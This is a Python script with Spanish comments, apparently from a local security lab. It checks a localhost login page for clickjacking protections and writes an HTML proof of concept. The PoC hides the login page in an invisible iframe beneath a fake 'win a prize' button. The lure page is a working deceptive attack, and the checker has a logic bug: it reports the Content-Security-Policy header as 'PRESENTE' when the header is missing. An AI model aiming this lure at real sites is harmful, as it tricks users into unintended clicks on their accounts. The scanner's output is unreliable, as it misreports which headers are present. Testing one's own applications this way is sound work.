import requests
import webbrowser
import os
import textwrap

'''VERIFICAR VULNERABILIDAD DE CLICKJACKING EN LOGIN.PHP'''

BOLD = '\033[1m'
END = '\033[0m'



def check_login_vulnerability():
    """Verifica si login.php es vulnerable
    Es vulnerable si:
    - No tiene X-Frame-Options
    - No tiene Content-Security-Policy con frame-ancestors
    - Permite GET (posible CSRF via clickjacking)
    - No tiene token CSRF"""
    
    url = "http://localhost:81/login.php"

    try:
        # Intentar acceder a login.php
        response = requests.get(url, timeout=5, allow_redirects=False)
        headers = response.headers
        print(f"Status Code: {response.status_code}")
        
        # Verificar redirección
        if response.status_code in [301, 302, 303, 307, 308]:
            redirect_to = headers.get('Location', 'Desconocido')
            print(f"redirección: {redirect_to}\n")
        
        # Verificar cabeceras de seguridad
        print(f"\n{BOLD}  CABECERAS DE SEGURIDAD:{END}\n")
        
        vulnerabilities = []
        
        # X-Frame-Options
        xfo = headers.get('X-Frame-Options')
        if xfo:
            print("X-Frame-Options: PRESENTE")
        else:
            print(f"X-Frame-Options: NO PRESENTE{END}")
            vulnerabilities.append('X-Frame-Options')

        # CSP
        csp = headers.get('Content-Security-Policy')
        if csp:
            print("Content-Security-Policy: PRESENTE")
            if 'frame-ancestors' in csp.lower():
                print("   frame-ancestors configurado")
            else:
                print("   frame-ancestors NO configurado")
                vulnerabilities.append('CSP frame-ancestors')
        else:
            print("Content-Security-Policy: PRESENTE")
            vulnerabilities.append('CSP')
        
        print(f"\n{BOLD}{'='*70}{END}")
        
        # Análisis adicional para login
        print(f"\n{BOLD} Análisis de login:{END}\n")
        
        # Verificar método HTTP
        methods_to_test = ['GET', 'POST']
        for method in methods_to_test:
            try:
                test_response = requests.request(method, url, timeout=3, allow_redirects=False)
                if test_response.status_code != 405:  # 405 = Method Not Allowed
                    print("Permitido método:", method)
                    if method == 'GET':
                        print("GET permite CSRF via clickjacking")
            except:
                pass
        
        # Verificar si requiere token CSRF
        if 'token' in response.text.lower() or 'csrf' in response.text.lower():
            print("Posible CSRF token presente")
        else:
            print("No se detectó protección CSRF")
            vulnerabilities.append('Sin protección CSRF')
        
        # Resultado final
        print(f"\n{BOLD}{'='*70}{END}")
        if vulnerabilities:
            print("Vulnerabilidades detectadas:")
            for vuln in vulnerabilities:
                print(f"  • {vuln}")
            print()
            return True
        else:
            print("Protegido contra clickjacking en login.php\n")
            return False
            
    except requests.exceptions.ConnectionError:
        print("No se pudo conectar a ", url)
        return None
    except Exception as e:
        print("Error durante la verificación:", str(e))
        return None


def generate_poc(target_url="http://localhost:81/login.php", output_file='poc.html'):
    """Genera el archivo HTML de explotación"""
    poc = textwrap.dedent(f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>PoC Clickjacking</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: #8458b6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            position: relative;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        h1 {{
            color: #333;
            margin-bottom: 30px;
        }}
        .fake-button {{
            background: #624b77;
            color: white;
            padding: 25px 60px;
            font-size: 1.8em;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 15px 40px rgba(70, 53, 90, 0.4);
            position: relative;
            z-index: 1;
        }}
        .malicious-iframe {{
            position: absolute;
            top: 52%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 800px;
            height: 700px;
            border: none;
            opacity: 0; /* Cambiar a 0.5 para DEBUG */
            z-index: 2;
        }}
        /* DESCOMENTAR PARA VER EL IFRAME:
        .malicious-iframe {{
            opacity: 0.5 !important;
            border: 5px solid red !important;
        }}
        */
    </style>
</head>
<body>
    <div class="container">
        <h1> ¡Gana un Premio! </h1>
        <button class="fake-button">¡PARTICIPAR AHORA!</button>
        <iframe class="malicious-iframe" src="{target_url}"></iframe>
    </div>
</body>
</html>""")


    with open(output_file, 'w', encoding='utf-8') as f:
            f.write(poc)
    
    print(f"\n PoC generado: {output_file}")
    print(f"   Abre este archivo en tu navegador para ver el ataque\n")


def main():
    #verificar vulnerabilidad
    is_vulnerable = check_login_vulnerability()
    
    if is_vulnerable is None:
        print("Error al verificar la vulnerabilidad. Asegúrate de que el servidor esté en ejecución.")
        return
    if is_vulnerable:
        # Generar PoC
        generate_poc()
    else:
        print("El sistema ya está protegido contra clickjacking en login.php.")

if __name__ == '__main__':
    main()